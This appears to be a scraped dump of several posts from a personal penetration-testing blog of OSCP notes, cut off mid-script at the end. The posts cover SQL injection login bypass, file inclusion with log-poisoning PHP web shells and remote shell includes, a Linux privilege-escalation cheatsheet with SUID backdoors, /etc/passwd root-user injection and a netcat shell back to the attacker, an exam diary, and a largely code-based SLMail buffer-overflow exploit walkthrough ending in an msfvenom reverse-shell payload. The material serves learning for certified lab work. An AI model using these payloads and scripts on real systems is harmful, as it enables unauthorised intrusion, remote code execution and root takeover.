NOT Thought Leader. A query for that would look something like this:\nSELECT first_name, last_name FROM population WHERE job is NOT \u0026quot;Thought Leader\u0026quot;;\rWhat is SQL Injection? SQL injection is a web based attack in which the malicious end-user enters an SQL query (in an input field or a parameter) which would append to the existing query in the logic tier of the application and this now new (malicious) query is passed on to the database which executes it, if it\u0026rsquo;s a fully-working query and not broken syntactically, and returns the result back to the end-user.\nCredit to XKCD Comics. If you've never checked them out, YOU SHOULD!\rConsidering the above comic, although destructive and not very beneficial, it still is a SQL injection.\rWhen a web application fails to properly sanitize the user input (parameters that are passed to the SQL statement or query), the malicious SQL query will be executed. This query will be executed with the same rights as the web server.\nIf a command is being executed on the system via the database server, this command will be executed on the system with the rights of whoever deployed the database server. If MySQL (mysqld) is running as root user, then the commands that will be executed on the system will be as root.\nClassic SQL Injection - Authentication Bypass How could I possibly end this post without actually displaying an SQL injection?! And welcome to the section you were waiting for.\nLet\u0026rsquo;s consider the following PHP code of a login page as an example: We are passing our input in the user and pass field\n# Takes the user input from the login POST request\r$user = $_POST['user'];\r$pass = $_POST['pass'];\r$query = \u0026quot;SELECT * FROM users WHERE username=$user AND password=$pass\u0026quot;;\rThe user controls the SQL query parameters \u0026ldquo;username\u0026rdquo; and \u0026ldquo;password\u0026rdquo; because they can potentially send in any value and it would be passed on to those parameters.\nLet\u0026rsquo;s consider a legitimate request first: POST login request sent by a legitimate user with user=admin\u0026amp;pass=amdin and there\u0026rsquo;s a typo in the password field\nThe SQL query that will be built with this request would be:\nSELECT * FROM users WHERE username=\u0026quot;admin\u0026quot; AND password=\u0026quot;amdin\u0026quot;;\rThe query will fetch all the entries in the database that matches username=admin and password=amdin. If no entries exist, the database will return nothing and so the logic tier will receive nothing from the database. The browser will then display whatever error is coded to display that login attempt has been failed. Maybe something like Incorrect Password.\nLet\u0026rsquo;s consider a malicious request now: POST login request sent by an attacker with user='or'1'='1';-- -\u0026amp;pass=lulz\nThe SQL query that will be built with that request would be:\nSELECT * FROM users WHERE username=''or'1'='1';-- - AND password=lulz';\rBy sending 'or'1'='1';-- - in the user field in the POST request, we did not only modify the username parameter but also commented out the rest of the query that was initially present, which is the password parameter of the WHERE condition check.\nWith this two modifications, our malicious query will always yield true due to the OR operand. Once this query is sent by the logic tier to the database server, the database server will execute it and return all the rows as the result!\nIf there is no check present as to how many rows the PHP code (logic tier) must recieve, it\u0026rsquo;ll by default take the first row (as it can\u0026rsquo;t take all) from the result received from the database server. Since this first row is very much a valid result, the logic tier would log the malicious user into the system (mostly as admin).\nWe\u0026rsquo;ve successfully performed an SQL Injection to bypass authentication mechanism!\nFin If you stuck around and read all the way till here, thank you! If you have any suggestions, queries or found a mistake, feel free to contact me, if you\u0026rsquo;d like me to credit you regarding it, I won\u0026rsquo;t mind that.\nRegarding this series\u0026hellip;it will go in depth from the basics to as advanced as I possibly can which would very much be out of the scope of OSCP and maybe even OSWE. There would probably be a weekly update to this series or as soon as I learn enough to blog about it. This series is not just to teach you about SQL injection but are also my personal notes if that gives you any more confidence about the quality of this.\nHave a great day, take care and hack the planet!\nRead the next post SQL Injection 0x02 - Testing \u0026amp; UNION Attacks\n","permalink":"http://localhost:1313/sqli-0x01/","title":"SQL Injection - 0x01"},{"content":"File Inclusion Introduction File inclusion vulnerabilities are of two types: Remote File Inclusion (RFI) and Local File Inclusion (LFI). RFI is said to be present when a web application allows remote users to load and execute a remote file on the server. LFI is said to be present when a web application allows remote users to load any pre-existing file and execute it on the server.\nThese vulnerabilities are often found in poorly written and/or deployed web applications which loads files or content to display it to the end-user, completely forgetting that this input could be modified.\nLFI Vulnerabiltiy What enables an attacker to exploit these vulnerabilities are include and require statements in the web applications\u0026rsquo; PHP code. With improper or thereof lack of input validation in place, an attacker could load any file that is present on the system, effectively exploiting a Local File Inclusion vulnerability.\nVulnerability Analysis What is going on behind the scenes?\nExample: loading a file from a URL parameter - filename URL : http://example.com/index.php?filename=helloworld Code :\ninclude($_GET['filename'] . '.php');\rWeb servers are dumb. The example code above basically tells the server that \u0026ldquo;Hey, whatever comes in the filename parameter append \u0026lsquo;.php\u0026rsquo; to that, fetch it for me, execute it and show it to the user.\u0026rdquo; Very convenient. So if any user were to pass some query to the filename parameter, the server will accept it, try to find the file, and show it to you if it exists in the place you asked it to look for, and if it has read permissions over the file.\nIf you thought \u0026ldquo;but Karan, wouldn\u0026rsquo;t the above code append \u0026lsquo;.php\u0026rsquo; to the query I pass? Wouldn\u0026rsquo;t the server execute it? How will I view the contents of it?\u0026rdquo;, you\u0026rsquo;re abosultely thinking in the right direction. If not, it\u0026rsquo;s ok, you\u0026rsquo;ll get there. I\u0026rsquo;ll cover that in the next section.\nVulnerability Testing When to test\n# URL or Post request\r?file=x\r?page=x.php\r# Target both\r?lang=en\u0026amp;post=x\rTesting\nIn PHP below version 5.3, URL ending in %00, a null-byte termination, causes the interpreter to accept it as the legit URL termination point and will ignore anything that comes after it like the \u0026lsquo;.php\u0026rsquo; extension that normally would be appended in the above example\nUse different tricks or payloads. PayloadsAllTheThings is a great resource. When the above trick fails, you can use plenty of others present in PayloadsAllTheThings. (I usually try a php:// filter next)\n# Add php at the end\r?file=x.\u0026lt;php\u0026gt;\r# Fetch a random file - Errors are nice\r?file=\u0026lt;random\u0026gt;.php\r# Keep the original path there, backtrack from there\r?page=files/ninevehNotes/../../../../../../../etc/passwd\r# PHP version below 5.3.4 - %00 for filename termination\r?page=files/ninevehNotes/../../../../../../../etc/passwd%00\r# Full path\r?file=C:\\Windows\\System32\\drivers\\etc\\hosts\rLFI To RCE Log Poisoning Log Locations First check if logs are accessible\n# Apache FreeBSD\r/var/log/httpd-access.log\r# Apache Ubuntu or Debian\r/var/log/apache2/access.log\r# Apache XAMPP\rC:\\XAMPP\\apache\\logs\\access.log\rExploiting Method 1: Sending a malicious request but malformed\n# Always use single-quotes in the PHP payload\r# Logs use double-quotes almost always\r# Connect to target\rnc -nv $target [port]\r# Send the following request\r# Test with system(), exec(), shell_exec()\r\u0026lt;?php shell_exec($_REQUEST['cmd']);?\u0026gt;\rMethod 2: Sendind a malicious request but legitimate\n# Capture a request using a proxy (BurpSuite)\r# Modify User-Agent HTTP header\r# Test with system(), exec(), shell_exec()\rUser-Agent: \u0026lt;?php shell_exec($_REQUEST['cmd']);?\u0026gt;\rVia SMTP telnet $target 25\r# Wait for server to respond\rEHLO anyname\rVRFY target@victim\rmail from:hacker@pwn.com\rrcpt to:target@victim\rdata\rSubject: Nothing to look here\r\u0026lt;?php echo system($_REQUEST['cmd']);?\u0026gt;\r# Enter a blank line\r. # Enter a period\r# wait for server response, exit\rGetting Code Execution Browse to the payload. Always execute the simplest command first.\n?file=../../../../../var/mail/target\u0026amp;cmd=id\r?page=../../../../../../var/log/apache2/access.log\u0026amp;cmd=id\rVulnerability - RFI What enables attackers to exploit RFI is not just poorly written application but also poorly configured PHP. Along with the usage include or require statements in the web application, the PHP must be configured to allow filesystem functions to use URLs to fetch data from.\nVulnerability Analysis These insecure configurations options are - allow_url_fopen and allow_url_include, and both should be set to On for RFI to occur. These options can viewed in the phpinfo file\nWhat is going on behind the scenes?\nExample: loading a file from a URL parameter - filename URL : http://example.com/index.php?filename=helloworld Code :\ninclude($_GET['filename'] . '.php');\rThe above code tells the server that, \u0026ldquo;Hey, whatever comes in the filename parameter append \u0026lsquo;.php\u0026rsquo; to that, fetch it for me, execute it and show it to the user.\u0026rdquo; Pretty much like LFI, except now the query to filename parameter doesn\u0026rsquo;t need to be a local file, it can be any file from anywhere. As long as the vulnerable server could connect to it and a file with the queried name is present, it\u0026rsquo;ll fetch it, and execute it. This makes RFI very dangerous.\nVulnerability Testing When to test PHPInfo should show that these parameters are On. If phpinfo file is unavailable and/or cannot be accessed, testing for RFI should still be done.\n# URL or Post request\r?file=x\r?page=x.php\r# Target both\r?lang=en\u0026amp;post=x\rTesting First test should be if the server actually connects to you or not. Start a webserver and fetch nothing\n# First test\r?file=http://$your_ip\r# Second test\r# Create a phpinfo file on the attacking machine and host it\r# File contents: \u0026lt;?php phpinfo();?\u0026gt;\r# Check important functions in 'disabled_functions' : system(), exec(), shell_exec(), etc\r?file=http://$your_ip/info.php\rGetting Code Execution # Webshell\r# Contents: \u0026lt;?php shell_exec($_GET['cmd']);?\u0026gt;\r?file=http://$your_ip/shell.php\u0026amp;cmd=id\r","permalink":"http://localhost:1313/file-inclusion/","title":"File Inclusion"},{"content":"Linux Privilege Escalation Cheatsheet So you got a shell, what now? This cheatsheet will help you with local enumeration as well as escalate your privilege further\nUsage of different enumeration scripts are encouraged, my favourite is LinPEAS Another linux enumeration script I personally use is LinEnum Abuse existing functionality of programs using GTFOBins\nNote: This is a live document. I\u0026rsquo;ll be adding more content as I learn more\nUnstable shell Send yourself another shell from within the unstable shell\nwhich nc\rnc $ip $port\rMake it functional Necessary for privilege escalation purposes\nwhich python[3]\rpython[3] -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\r# Ctrl+Z\r# In Kali\rstty -a # Notice number of rows and columns\rstty raw -echo \u0026amp;\u0026amp; fg\r# On target system\rreset\rstty rows xx\rstty columns yy\rexport TERM=xterm-256color\rGeneral info # username, groups\rid\rhostname\r# Part of too many groups? Find out all the files you've access to\rfor i in $(groups); do echo \u0026quot;=======$i======\u0026quot;; find / -group $i 2\u0026gt;/dev/null | grep -v \u0026quot;proc\u0026quot; \u0026gt;\u0026gt; allfiles; done\r# Interesting internally listening ports?\rnetstat -anpt\r# Look what the user was up to\rless .bash_history\rless mysql_history\r# Check user accounts\rcat /etc/passwd | grep \u0026quot;sh$\\|python\u0026quot;\rsudo -l\rAutomated enumeration # Automated local enumeration\r# Look for any highlighted stuff\r# Cron jobs\r# Non-standard scripts or programs\r# Hardcoded credentials. Check password re-use against existing accounts\r./linpeas.sh -q\r./linenum.sh\rAbusing sudo Can sudo but absolute path is specified? Use ltrace to view libraries being loaded by these programs and check if absolute path is specified or not\n# Easy win?\rsudo -l # Check programs on GTFOBins\r# Can sudo, abosulte path not specified?\recho \u0026quot;/bin/sh\u0026quot; \u0026gt; \u0026lt;program_name\u0026gt;\rchmod 777 \u0026lt;program_name\u0026gt;\r# Export PATH=.:$PATH\rsudo \u0026lt;program_name\u0026gt;\rWeak file permissions # Writable /etc/passwd?\rRemove 'x' beside a username --\u0026gt; no password\r# Create a new user\ropenssl passwd \u0026quot;lol\u0026quot; # Prints out a hash\r# Make a new entry at the end of /etc/passwd\rnotahacker:$passwd_hash:0:0:/root:/bin/bash # Become r00t yourself\r# /dev/sda1 readable?\rdebugfs /dev/sda1 # Get root's SSH private key Abusing CRON jobs # Writable CRON program?\r# Insert language specific reverse shell\r# Writable library?\r# Back up library\r# Insert language specific reverse shell at the end of the library\r# Make root give you a bash SUID program\r# Make getroot.sh file with following contents and wait for CRON job to run the program\r#!/bin/dash\rcp /bin/dash /tmp/backdoor\rchown root:root /tmp/backdoor\rchmod u+s /tmp/backdoor\r# Execute /tmp/backdoor to get a root shell\rcp /bin/bash /tmp/backdoor\rchmod 6755 /tmp/backdoor\r# Execute /tmp/backdoor -p to get a root shell\rUse a suid program and use as per context getsuid.c\n// BOTH WORKS\r// gcc -o suid getsuid.c\r// AS INTENDED USER - // chown root:root suid\r// chmod 6755 suid\r// immediately spawns shell upon execution int main() {\rsetuid(0);\rsystem(\u0026quot;/bin/bash -p\u0026quot;);\r}\r// or better, execvp doesn't drop euid\r// able to handle more things without any modifications\r// run commands as root\r#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\rint main(int argc, const char * argv[]){\rif (argc \u0026gt; 1) printf(\u0026quot;%s\u0026quot;,execvp(argv[1],\u0026amp;argv[1]));\rreturn 0;\r}\rAbusing wildcards Check out this fantastic document of a talk\nAbusing chmod Abusing chown Abusing tar Abusing rsync Abusing NFS \u0026lt; 4 Refer to my personal notes for exploiting NFS \u0026lt; 4\n","permalink":"http://localhost:1313/privesc-linux/","title":"Linux Privilege Escalation"},{"content":"OSCP Journey From a persistent n00b who couldn\u0026rsquo;t even hack a medium difficulty machine on his own to cracking OSCP in 4 months!\nBackground I wanted to do the PwK course and clear OSCP since past couple years but haven\u0026rsquo;t been able to due to reasons. Two of my certifications were going to expire in August \u0026lsquo;20, and I had to do a certification to renew them, a perfect opportunity. Before I started with the PwK course, I had very little experience with hacking or even CTF for that matter. My college studies or previous certifications weren\u0026rsquo;t of any help here either. But I decided to take a deep breath, and dive in.\nPrep My course and lab access started in January, it was the old course, I completed all of my exercises and was only able to crack 14 machines in the Public Network. Not good by any standards, but it was just a start. I was glad I was able to do enough to make my lab report. Once my lab access got over, I took a break of 2 months, focussed on college.\nTwo months later, in March, I decided to start preparing for the exam. I came across OSCP-like machines list by TJ_Null which looked quite promising and so signed-up for the HackTheBox VIP platform.\nI went through every machine (approximately 50) in two months. I watched IppSec\u0026rsquo;s video of the machine I\u0026rsquo;m targetting, and hacked it and continued that for almost every machine. I made a report for each machine I hacked and documented each step including why certain steps were taken, why it worked and why something I was trying did not, and the reasoning behind it. This was essential because I was under a time crunch, needed to build my hacking methodology, and make it as robust as I possibly can. Apart from watching IppSec\u0026rsquo;s video, I read walkthroughs by various people of the same machine to get more information, their thought process and learnings out of it. All my learnings can be found here\nHACK EVERY SINGLE MACHINE ON THAT LIST!!! You\u0026rsquo;ll thank yourself later.\nAnd that was it, and that\u0026rsquo;s all the practice you need apart from buffer overflow. For the buffer overflow, practice on SLMail and Brainpan on a free Windows VM available here. Remember to run the VM in a host-only network and turn off protection mechanisms. My buffer overflow cheatsheet can be found here\nExam I had scheduled my exam at 3.30 AM, everyone is asleep, can peacefully work on my stuff without any external disturbances. Proctoring started at 3.15 AM, took a little time but went smoothly. Started with my exam at 3.45 AM. I decided to first get done with Buffer Overflow, easy 25 points. Started AutoRecon on the other 25 point machine in the background. Ran first few commands, and suddenly I\u0026rsquo;m not receiving any output from the debugging machine, it was completely frozen. Huh? I thought it could be some issue with rdesktop, tried to kill it, it won\u0026rsquo;t die. Checked my connection, it was re-connecting. Ugh. Killed the connection, tried to connect to the VPN again, it was trying to connect. I looked down at my taskbar at the internet connection icon, and there it was - my worst nightmare, the internet has crashed. It was 4 AM and I won\u0026rsquo;t be getting any support from the ISPs\u0026rsquo; end. FUCK. I took my phone, turned the hotspot on, connected to the proctoring software, informed the proctor that my internet has crashed and I\u0026rsquo;m changing my location. They informed me that they would pause the VPN, I agreed.\nI called a bunch of folks where I could continue the rest of the exam from, some places are completely locked down, can\u0026rsquo;t go there. Can go to a relative\u0026rsquo;s place, 50 minutes away by car, their building has a bunch of Covid-19 cases in there, and a whole lot in a hospital near that place. Fuck me. Looked for cabs, luckily I found one, booked it immediately, packed my stuff. It was 5 AM, I\u0026rsquo;ve got nothing and chances are I could catch the virus, not the best of odds.\nCracking BOF - 25 points It was 6.20 AM, I finally reached the place, sanitized myself, and unpacked. Showed the proctor my environment again, got the green light to continue with my exam. Started AutoRecon on the 25 pointer again, focussed on BOF, and cracked it by 7 AM. I\u0026rsquo;ve got 25 points in 3.5 hours, 45 points more, any 3 more boxes to crack. It was time to focus on the other 25 pointer, luckily AutoRecon was done. Ran AutoRecon on one of the 20 pointer machine. Checked my directory for the 25 pointer recon results\u0026hellip;.aaaand it\u0026rsquo;s gone. The new scan command probably overwrote it. Internal screaming. Chucked AutoRecon entirely, moved to nmapAutomator. Best move so far.\nRan nmapAutomator on the 25 pointer machine, it printed out its finding as it went on, perfect. Poked at the open ports found one by one, looked for publicly known exploits against any service or name I was coming across using searchsploit and Google, and ran enumeration scripts. Consecutive scanning proved a whole lot better than parallel scanning. Couldn\u0026rsquo;t find anything on the 25 pointer, moved on. Ran nmapAutomator on the 20 point machine, poked open ports one by one, repeated the enumeration process, again found nothing. Scanned the other 20 point machine, poked open ports, repeated the enumeration process, landed no where. It was noon by then and I only had 25 points so far. Needed some fresh air.\nCracking 10 pointer I took a break for few minutes, I realized I had not looked at the 10 pointer machine yet, thought \u0026ldquo;welp here goes nothing.\u0026rdquo; Got back from the break, scanned 10 pointer machine, performed the enumeration process, found the vunlerable thing! ╰(°▽°)╯. Pwned the machine in 20 minutes. Checked enumeration results of the other machines again, nothing clicked. It was 1 PM and I had 35 points, 35 more to go.\nCracking 20 pointer Took a lunch break for 30 minutes. Checked the enumeration results on one of the 20 pointer, saw a promising exploit, there were 2 versions: manual and metasploit. I was not sure if I should blow my metasploit chance yet. In retrospect, I should\u0026rsquo;ve and you\u0026rsquo;ll soon realize why. I was up for around 10 hours now, and I was already tired cause of all the gymnatics and so stressed you could see it physically. I checked the manual exploit, it was written in broken english but the steps were obvious, tried to follow it, did not work, but had a strong feeling that it would (hint: msf module). I tried various patterns of it without achieving anything for a couple hours. I got so tired I execute the simplest thing I could imagine, should have done that as my first try, and decided to move on if that won\u0026rsquo;t work. IT WORKED! Realized why my previous exploits weren\u0026rsquo;t working and felt like a total moron.\nUpdated my exploit according to the new information, got a low shell but was highly unustable. Checked the MSF module, decided to make my exploit as per the MSF module instead of using Metasploit itself. It worked! Got a low shell, escalated my privileges in 5 minutes. Done. It was 7 PM, and I had 55 points. Time for another break.\nCracking 25 pointer Got back from the break, checked my enumeration results again, realized this is all the data I had to work with. Again checked for publicly known exploits for a particular thing, but I did not know it\u0026rsquo;s version. I was looking for exploits with that exact name of the thing for too long (bad move), with no results. Felt like giving up, tried the generic name exploit and IT WORKED! I already had that information since 7:30 AM, I wasted away all these hours sigh. Got a low shell by midnight.\nRan the local enumeration script on the system, pretty quickly identified a lot of rabbit holes. But coud not find the way to escalate my privileges, spend 2 more hours just scrambling. Realized the privilege escalation was right in front of my eyes, again it wasn\u0026rsquo;t anything complex. Some non-standard application on system. Looked up publicly known exploit, one entry \u0026ldquo;Software name privilege escalation\u0026rdquo;. facepalm.\nTried to get the exploit to work with just 40 minutes to go. Unable to get it to execute as per what I wanted. Something was off. Tried to follow the exploit steps manually, I could follow them, but it wasn\u0026rsquo;t working. Maybe a rabbit hole? Nope, it couldn\u0026rsquo;t be, it was the only thing that stood out, or atleast that\u0026rsquo;s what I felt. Realized it was based on something, modified that, followed the steps again. Get a message on the side from proctor that my time is up and that VPN has been closed. I couldn\u0026rsquo;t escalate my privileges in time, neither could I say I found the right thing.\n24 hours - 65 points Reporting I wrote both my exam report and lab report and submitted them as per instructions by 2:30 AM the next day. I was hoping to get the 5 bonus points and clear the certification. Surprisingly, I didn\u0026rsquo;t have to wait long and get my result in 2 days. I\u0026rsquo;ve successfully obtained the certification!\nTakeaway Things to keep in mind:\nI want you to know that this exam is EASY. I know the margin by which I cleared, yet still I\u0026rsquo;ll say the same. If it wasn\u0026rsquo;t for my overthinking and external failure, it\u0026rsquo;d have been a walk in the park This exam is INTENDED to be completed in 12 hours. Good thing we have 24 Improved Enumeration Process nmapAutomator each IP consecutively nmapAutomator $IP All Check each port for as much info as you can Run the usual enumeration scripts against the services and system Use different wordlists searchsploit each service, web application, or odd software you come across Look at valuable exploits from the entire result Something that can give you either more information or increase your privileges Arbitary file upload Arbitary file download Code execution LFI RFI SQLi Once these exploits have been identified, Either try them all out one by one Or filter by version, then try whatever is left Do Stay calm Take breaks frequently Stay structured Sleep Understand the exploit Make a checklist of it\u0026rsquo;s underlying requirement for it to work Execute the simplest command you can execute first Make a note of parameters it\u0026rsquo;s using Don\u0026rsquo;t Scan all IPs at once - overloading network will give you incomplete results Panic Overlook exploits because names do not match exactly (This costed me over 5 hours) Be afraid to use your Metasploit card (This costed me 4 hours) ","permalink":"http://localhost:1313/oscp-journey/","title":"OSCP Journey"},{"content":"Windows 32-Bit Buffer Overflow SLMail Example\nPractice these:\nSLMail - download from exploit-db Brainpan - download from vulnhub Step By Step Scripts All the scripts are available here as well as at the bottom.\nconnect.py Making sure connection and all the operations are successfully performed is crucial as everything will be built on this script/step.\nimport socket\rimport sys\rrhost = \u0026quot;192.168.\u0026quot;\rrport = 110\rtry:\rs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\rs.connect((rhost,rport))\rprint s.recv(1024)\rs.send('USER test\\r\\n')\rprint s.recv(1024)\rs.send('PASS asdf\\r\\n')\rprint s.recv(1024)\rs.send('QUIT\\r\\n')\rs.close()\rexcept:\rprint \u0026quot;Oops! Something went wrong!\u0026quot;\rsys.exit()\rfuzzer.py Once you\u0026rsquo;re successfully able to connect to the service, can perform authentication, and quit gracefully, it\u0026rsquo;s time to fuzz.\nimport socket\rimport sys\rrhost = \u0026quot;192.168\u0026quot;\rrport = 110\rpayload = \u0026quot;\u0026quot;\rpayload += \u0026quot;A\u0026quot; * 100\rwhile True:\rtry:\rprint \u0026quot;Fuzzing with %s bytes...\u0026quot; % len(payload)\rs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\rs.connect((rhost,rport))\rs.recv(1024)\rs.send(\u0026quot;USER test\\r\\n\u0026quot;)\rs.recv(1024)\rs.send(\u0026quot;PASS \u0026quot; + payload + \u0026quot;\\r\\n\u0026quot;)\rs.recv(1024)\rs.send(\u0026quot;QUIT\u0026quot;)\rs.close()\rpayload += \u0026quot;A\u0026quot;*100\rexcept:\rprint \u0026quot;Oops! Something went wrong!\u0026quot;\rprint \u0026quot;Fuzzing crashed at %s bytes\u0026quot; % len(payload)\rsys.exit()\rgetoffset.py Once the application is fuzzed at X, lets say 2700, bytes, create a unique string of X+200 (or 300) bytes, let\u0026rsquo;s say 3000 bytes, using msf-pattern_create like below:\nmsf-pattern_create -l 3000\rAssign this unique string to the payload variable\nimport socket\rimport sys\rrhost = \u0026quot;192.168\u0026quot;\rrport = 110\rpayload = \u0026quot;\u0026quot;\rpayload += \u0026quot;PASS \u0026quot;\rpayload += \u0026quot;\u0026lt;enter unique string here\u0026gt;\u0026quot;\rpayload += \u0026quot;\\r\\n\u0026quot;\rtry:\rprint \u0026quot;Overflowing with %s bytes...\u0026quot; % len(payload)\rs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\rs.connect((rhost,rport))\rs.recv(1024)\rs.send(\u0026quot;USER test\\r\\n\u0026quot;)\rs.recv(1024)\rs.send(payload)\rs.recv(1024)\rs.send(\u0026quot;QUIT\u0026quot;)\rs.close()\rexcept:\rprint \u0026quot;Oops! Something went wrong!\u0026quot;\rsys.exit()\rMake a note of the address that the EIP was overwriten with, use msf-pattern_offset to find the offset, like below:\nmsf-pattern_offset -l 3000 -q \u0026lt;enter EIP address\u0026gt;\rThis will provide you with the offset at which the EIP will be written at. If the offset is 2606, then that means from byte 2607 to byte 2610 will determine the EIP address, and the rest will go into ESP.\ncontroleip.py Next step is to ensure the offset we received is actually right. To do so, we\u0026rsquo;ll put 4 \u0026ldquo;B\u0026quot;s from byte 2607 till byte 2610.\nimport socket\rimport sys\rrhost = \u0026quot;192.168\u0026quot;\rrport = 110\r# Total payload size to be sent, size = 3200\rpayload = \u0026quot;A\u0026quot;*2606+\u0026quot;B\u0026quot;*4\rpayload += \u0026quot;C\u0026quot;*(size - len(payload))\rrequest = \u0026quot;\u0026quot;\rrequest += \u0026quot;PASS \u0026quot;\rrequest += payload\rrequest += \u0026quot;\\r\\n\u0026quot;\rtry:\rs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\rs.connect((rhost,rport))\rs.recv(1024)\rs.send(\u0026quot;USER test\\r\\n\u0026quot;)\rs.recv(1024)\rs.send(request)\rs.recv(1024)\rs.send(\u0026quot;QUIT\u0026quot;)\rs.close()\rexcept:\rprint \u0026quot;Oops! Something went wrong!\u0026quot;\rsys.exit()\rIf the application crashes with EIP with the address : 42424242, which is hex for BBBB, we\u0026rsquo;ll move on to the next step\nbadchar.py Finding bad characters is an iterating process. You will be sending characters from 0x01 to 0xff, and upon countering a character that breaks or is escaped by the application, that character is removed from the character array and the process is repeated. Bad characters aren\u0026rsquo;t necessarily just the null byte (0x00), newline (\\n - 0x0a), and carriage return (\\r - 0x0d).\nTake a good 20 minutes, sit down, and identify each and every bad character\nTo know what hex is which character - man ascii or asciitables website\nimport socket\rimport sys\rrhost=\u0026quot;192.168\u0026quot;\rrport=110\rsize = 3200\rpayload = \u0026quot;\u0026quot;\rpayload += \u0026quot;PASS \u0026quot;\rpayload += \u0026quot;A\u0026quot;*2606\r# Bad chars identified - 0x00\rbadchars = (\u0026quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\u0026quot;\r\u0026quot;\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026quot;\r\u0026quot;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\u0026quot;\r\u0026quot;\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\u0026quot;\r\u0026quot;\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\u0026quot;\r\u0026quot;\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\u0026quot;\r\u0026quot;\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\u0026quot;\r\u0026quot;\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026quot;)\rpayload += badchars\rpayload += \u0026quot;D\u0026quot;*(size-len(payload))\rpayload += \u0026quot;\\r\\n\u0026quot;\rtry:\rprint \u0026quot;Testing bad chars...\u0026quot;\rs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\rs.connect((rhost,rport))\rs.recv(1024)\rs.send(\u0026quot;USER test\\r\\n\u0026quot;)\rs.recv(1024)\rs.send(payload)\rs.close()\rexcept:\rprint \u0026quot;Oops! Something went wrong!\u0026quot;\rsys.exit()\rFinding JMP Pointer Once all the bad characters are found, we\u0026rsquo;ll find the JMP ESP pointer from the Immunity Debugger itself using mona. Since I am using SLMail as my example, the bad characters that I will be avoiding are - 0x00 0x0a 0x0d\n!mona jmp -r esp -cpb \u0026quot;\\x00\\x0a\\x0d\u0026quot;\rBy executing the above command you will not only find the addresses, without protection mechanisms, that would perform JMP ESP but also ensure that none of the addresses has any of the bad characters in itself.\nPlease ensure you select an address from the applications\u0026rsquo; DLL ONLY, and NOT from OS DLLs. Application DLLs will be constant across operating systems, but we can NOT say the same for OS DLLs.\njmpesp.py Now that we have our EIP on our hand, let\u0026rsquo;s see if we actually reach there and that it does go where we want it to.\nIn the Immunity Debugger, \u0026ldquo;go to\u0026rdquo; the address you selected and toggle breakpoint on.\nimport socket\rimport struct\rimport sys\rrhost=\u0026quot;19.168.\u0026quot;\rrport=110\rsize = 3200\rptr_jmp_esp = 0x5F4A358F\rpayload = \u0026quot;\u0026quot;\rpayload += \u0026quot;PASS \u0026quot;\rpayload += \u0026quot;A\u0026quot;*2606\rpayload += struct.pack(\u0026quot;\u0026lt;I\u0026quot;,ptr_jmp_esp) # Automatic little endian conversion\rpayload += \u0026quot;C\u0026quot;*(size-len(buff))\rpayload += \u0026quot;\\r\\n\u0026quot;\rtry:\rprint \u0026quot;Gaining EIP...\u0026quot;\rs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\rs.connect((rhost,rport))\rs.recv(1024)\rs.send(\u0026quot;USER test\\r\\n\u0026quot;)\rs.recv(1024)\rs.send(payload)\rs.close()\rexcept:\rprint \u0026quot;Oops! Something went wrong!\u0026quot;\rsys.exit()\rOnce we hit the breakpoint, first test is complete. Now let the application continue execution till return to ensure it actually goes in to the ESP.\nshelly.py Now that we found the right address, and verified it. Let\u0026rsquo;s get a reverse shell. I will be using a stageless shellcode since I have more than enough space to do so.\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=443 -f py -a x86 -b \u0026quot;\\x00\\x0a\\x0d\u0026quot; --var-name shellcode EXITFUNC=thread\rThe above command will generate a shellcode, but in python3 format, which I\u0026rsquo;m not using for now, so we will remove the \u0026ldquo;b\u0026quot;s in the front every line and then paste it in our exploit code. By not specifying an encoder, msfvenom will automatically choose one on it\u0026rsquo;s own, which is good.\nimport socket\rimport struct\rimport sys\rrhost=\u0026quot;192.168.\u0026quot;\rrport=110\rsize = 3200\r# 5F4A358F FFE4 JMP 